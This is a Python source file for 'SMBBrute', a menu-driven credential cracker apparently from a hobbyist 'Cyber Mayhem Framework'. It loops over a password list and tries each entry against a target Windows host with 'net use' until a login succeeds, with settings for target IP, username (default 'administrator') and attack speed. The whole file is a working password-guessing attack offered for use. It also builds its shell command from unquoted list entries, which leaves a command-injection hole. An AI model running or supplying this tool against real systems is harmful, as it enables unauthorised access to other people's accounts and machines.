import os
from colorama import init, Fore
import subprocess
import time

exploit_params = {
    "RHOST": {"value": "127.0.0.1", "required": True, "description": "IP address to target"},
    "USER": {"value": "administrator", "required": True, "description": "User to target"},
    "PASSLIST": {"value": "passwords.txt", "required": True, "description": "Path to password list file"},
    "EXPIRES": {"value": "0", "required": False, "description": "Seconds until expiration"},
    "MODE": {"value": "normal", "required": False, "description": "Attack speed (light, normal, sprint)"},
    "DISPLAY": {"value": "false", "required": False, "description": "Display attempts (true/false)"}
}

def display_banner():
    os.system('cls')
    print(Fore.YELLOW + """
    ___ __  __ ___ ___ ___ _   _ _____ ___ 
   / __|  \/  | _ ) _ ) _ \ | | |_   _| __|
   \__ \ |\/| | _ \ _ \   / |_| | | | | _| 
   |___/_|  |_|___/___/_|_\\_____/ |_| |___|
                                         
    """)

def display_description():
    print(Fore.BLUE + "~( {:^40} )~".format("SMBBrute - SMB credentials cracker"))
    print(Fore.CYAN + "~( {:^40} )~".format("Vectortize (Nullioner)"))
    print("{:^46}".format("Cyber Mayhem Framework"))
    print()
    print(Fore.BLUE + "~[ {:^40} ]~".format("Version: 1.0.0"))
    print(Fore.BLUE + "~[ {:^40} ]~".format("Lightweight program"))
    print(Fore.BLUE + "~[ {:^40} ]~".format("Supports custom passlists") + Fore.RESET)
    print()

def help_command():
    print("Available commands:")
    print("  help      - Display available commands")
    print("  info      - Show brute details")
    print("  set       - Set brute parameters")
    print("  run       - Start the brute force process")
    print("  exit      - Exit SMBBrute")
    print()

def info_command():
    print("{:<10} {:<40} {:<10} {:<30}".format("NAME", "VALUE", "REQ", "DESCRIPTION"))
    print("{:<10} {:<40} {:<10} {:<30}".format("-" * 10, "-" * 40, "-" * 10, "-" * 30))
    for name, data in exploit_params.items():
        value = data["value"]
        if name == "PASSLIST":
            display_value = os.path.basename(value.rstrip('"'))
        else:
            display_value = value
        req = "yes" if data["required"] else "no"
        description = data["description"]
        print("{:<10} {:<40} {:<10} {:<30}".format(name, display_value, req, description))
    print()

def set_command(parameters):
    if not parameters:
        print(Fore.CYAN + "[" + Fore.RESET + "?" + Fore.CYAN + "] " + Fore.RESET + Fore.YELLOW + "Usage: set PARAMETER_NAME VALUE" + Fore.RESET)
        print(Fore.CYAN + "[" + Fore.RESET + "?" + Fore.CYAN + "] " + Fore.RESET + Fore.YELLOW + "Example: set PASSLIST \"C:\\Users\\OEM\\Downloads\\passwordlist.txt\"" + Fore.RESET)
        return

    name = parameters[0].upper()
    if name not in exploit_params:
        print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + "Invalid parameter name. Type 'info' to see available parameters." + Fore.RESET)
        print()
        return

    if len(parameters) > 1:
        value = " ".join(parameters[1:])
        previous_value = exploit_params[name]["value"]
        exploit_params[name]["value"] = value
        if previous_value == value:
            print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + f"{name} already set to {value}." + Fore.RESET)
        else:
            print(Fore.GREEN + "[" + Fore.RESET + "+" + Fore.GREEN + "] " + f"{name} set to {value}." + Fore.RESET)
    else:
        default_values = {
            "RHOST": "127.0.0.1",
            "USER": "administrator",
            "PASSLIST": "passwords.txt",
            "EXPIRES": "0",
            "MODE": "normal",
            "DISPLAY": "false"
        }
        default_value = default_values.get(name, "")
        previous_value = exploit_params[name]["value"]
        exploit_params[name]["value"] = default_value
        if previous_value == default_value:
            print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + f"{name} already set to default." + Fore.RESET)
        else:
            print(Fore.GREEN + "[" + Fore.RESET + "+" + Fore.GREEN + "] " + f"{name} set to default." + Fore.RESET)
        print()

def run_command():
    try:
        target_ip = exploit_params["RHOST"]["value"]
        username = exploit_params["USER"]["value"]
        password_list = exploit_params["PASSLIST"]["value"].strip('"')
        expires = exploit_params["EXPIRES"]["value"]
        mode = exploit_params["MODE"]["value"]

        if "DISPLAY" in exploit_params:
            display_attempts = exploit_params["DISPLAY"]["value"].lower() == "true"
        else:
            display_attempts = False

        errors = []

        if not os.path.exists(password_list):
            errors.append(f"Invalid list path: {password_list}")

        if not target_ip:
            errors.append(f"Invalid target IP: {target_ip}")

        try:
            expires = int(expires)
            if expires < 0:
                expires = 0
        except ValueError:
            expires = 0

        if mode not in ["light", "normal", "sprint"]:
            mode = "normal"

        if display_attempts not in [True, False]:
            display_attempts = False

        if errors:
            for error in errors:
                print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + error + Fore.RESET)
            print()
            print(Fore.RED + "[" + Fore.RESET + "-" + Fore.RED + "] " + "Process failed to run, invalid parameters." + Fore.RESET)
            return

        print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + "Starting brute force process..." + Fore.RESET)
        print(Fore.GREEN + "[" + Fore.RESET + "+" + Fore.GREEN + "] " + "Process has started successfully!" + Fore.RESET)

        if expires > 0:
            start_time = time.time()

        count = 1
        with open(password_list, 'r') as file:
            for password in file:
                password = password.strip()

                net_use_command = f"net use \\\\{target_ip} /user:{username} {password}"
                result = subprocess.run(net_use_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                if result.returncode == 0:
                    print(Fore.GREEN + "[" + Fore.RESET + "+" + Fore.GREEN + "] " + f"Password found: {password}" + Fore.RESET)
                    print()
                    break

                if display_attempts:
                    print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + f"Attempt {count}: {password}" + Fore.RESET)

                count += 1

                if mode == "light":
                    time.sleep(0.5)
                elif mode == "normal":
                    time.sleep(0.1)
                elif mode == "sprint":
                    time.sleep(0.00001)

                if expires > 0:
                    elapsed_time = time.time() - start_time
                    if elapsed_time >= expires:
                        print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + "Request timed out." + Fore.RESET)
                        print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + "Brute force process expired." + Fore.RESET)
                        break
            else:
                print(Fore.RED + "[" + Fore.RESET + "-" + Fore.RED + "] " + "Password not found." + Fore.RESET)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + "Brute force stopped forcefully. Returning to menu." + Fore.RESET)
        return

def main():
    display_banner()
    display_description()

    for name, data in exploit_params.items():
        if not data["value"]:
            default_values = {
                "RHOST": "127.0.0.1",
                "USER": "administrator",
                "PASSLIST": "passwords.txt",
                "EXPIRES": "0",
                "MODE": "normal",
                "DISPLAY": "false"
            }
            exploit_params[name]["value"] = default_values.get(name, "")

    try:
        while True:
            command = input("SMB" + Fore.CYAN + "> " + Fore.RESET).strip().lower()

            if command == 'help':
                help_command()
            elif command == 'info':
                info_command()
            elif command.startswith('set '):
                parameters = command.split()[1:]
                set_command(parameters)
            elif command == 'run':
                run_command()
            elif command == 'exit':
                print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + "Quitting SMBBrute..." + Fore.RESET)
                break
            else:
                print(Fore.CYAN + "[" + Fore.RESET + "?" + Fore.CYAN + "] " + Fore.RESET + Fore.YELLOW + "Invalid command. Type 'help' for available commands." + Fore.RESET)
                print()

    except KeyboardInterrupt:
        print()
        print(Fore.YELLOW + "[" + Fore.RESET + "!" + Fore.YELLOW + "] " + "Quitting SMBBrute..." + Fore.RESET)

if __name__ == "__main__":
    init(autoreset=True)
    main()
